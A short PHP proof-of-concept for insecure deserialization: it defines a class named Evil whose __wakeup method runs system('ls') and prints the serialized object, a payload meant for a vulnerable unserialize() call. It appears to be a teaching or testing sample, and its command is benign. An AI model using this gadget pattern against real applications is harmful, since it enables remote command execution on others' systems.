<?php 
class Evil {
    public function __wakeup(){
        system('ls');
    }
}
$evilObject = new Evil();
echo serialize($evilObject);
?>